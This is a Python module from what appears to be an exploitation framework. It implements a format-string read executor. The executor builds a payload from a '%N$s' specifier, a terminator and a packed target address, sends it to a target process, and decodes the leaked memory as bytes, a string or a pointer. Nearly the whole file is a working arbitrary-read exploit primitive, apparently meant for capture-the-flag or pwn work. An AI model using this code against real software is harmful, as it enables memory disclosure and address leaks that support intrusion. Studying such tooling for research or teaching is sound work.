from __future__ import annotations

from dataclasses import dataclass
from typing import TYPE_CHECKING

from ...core.models import FmtLeak, FmtReadMode, FmtTargetRef
from .runtime import dispatch_fmt_payload

if TYPE_CHECKING:
    from chun.core.session import CHunSession


@dataclass(slots=True)
class DefaultFmtReadExecutor:
    """默认的 fmt 读取执行器。"""

    default_terminator: bytes = b"::CHUN::"
    default_recv_bytes: int = 4096

    def read(
        self,
        session: "CHunSession",
        target: FmtTargetRef,
        *,
        size: int,
        mode: FmtReadMode,
        offset: int,
        terminator: bytes | None = None,
        recv_bytes: int | None = None,
        newline: bool = True,
        source: str = "fmt.read",
    ) -> FmtLeak:
        resolved_terminator = self.default_terminator if terminator is None else terminator
        pointer_size = self._pointer_size(session)
        endian = self._endian(session)
        payload = self._build_payload(
            target=target,
            offset=offset,
            pointer_size=pointer_size,
            endian=endian,
            terminator=resolved_terminator,
        )
        response, dispatch, metadata = dispatch_fmt_payload(
            session,
            payload,
            receive=True,
            newline=newline,
            recv_bytes=recv_bytes or self.default_recv_bytes,
            recv_until=resolved_terminator,
        )
        raw = self._extract_raw_body(response or b"", resolved_terminator)
        decoded = self._decode(raw, size=size, mode=mode, endian=endian)
        return FmtLeak(
            target=target,
            address=target.address,
            size=size,
            mode=mode,
            raw=raw[:size],
            decoded=decoded,
            offset=offset,
            source=source,
            metadata={
                "payload": payload,
                "terminator": resolved_terminator,
                "dispatch": dispatch.value,
                "transport_kind": session.transport_spec.kind,
                **metadata,
            },
        )

    def _build_payload(
        self,
        *,
        target: FmtTargetRef,
        offset: int,
        pointer_size: int,
        endian: str,
        terminator: bytes,
    ) -> bytes:
        return (
            f"%{offset}$s".encode()
            + terminator
            + target.address.to_bytes(pointer_size, byteorder=endian, signed=False)
        )

    @staticmethod
    def _extract_raw_body(response: bytes, terminator: bytes) -> bytes:
        if not terminator:
            return response
        marker = response.find(terminator)
        if marker >= 0:
            return response[:marker]
        return response

    @staticmethod
    def _decode(
        raw: bytes,
        *,
        size: int,
        mode: FmtReadMode,
        endian: str,
    ) -> int | bytes | str | None:
        body = raw[:size]
        if mode == FmtReadMode.RAW:
            return body
        if mode == FmtReadMode.STRING:
            return body.decode("latin-1", errors="replace")
        if mode == FmtReadMode.POINTER:
            if not body:
                return None
            return int.from_bytes(body, byteorder=endian, signed=False)
        raise ValueError(f"unsupported fmt read mode: {mode}")

    @staticmethod
    def _pointer_size(session: "CHunSession") -> int:
        elf = getattr(session, "elf", None)
        if elf is not None and getattr(elf, "bits", None):
            return int(elf.bits) // 8
        entry = session.rec.get_context("arch.pointer_size")
        if entry is not None:
            value = entry.value if hasattr(entry, "value") else entry
            return int(value)
        bits_entry = session.rec.get_context("arch.bits")
        if bits_entry is not None:
            value = bits_entry.value if hasattr(bits_entry, "value") else bits_entry
            return int(value) // 8
        return 8

    @staticmethod
    def _endian(session: "CHunSession") -> str:
        elf = getattr(session, "elf", None)
        if elf is not None and getattr(elf, "little_endian", None) is not None:
            return "little" if bool(getattr(elf, "little_endian", True)) else "big"
        entry = session.rec.get_context("arch.endian")
        if entry is not None:
            value = entry.value if hasattr(entry, "value") else entry
            return str(value)
        return "little"


__all__ = ["DefaultFmtReadExecutor"]
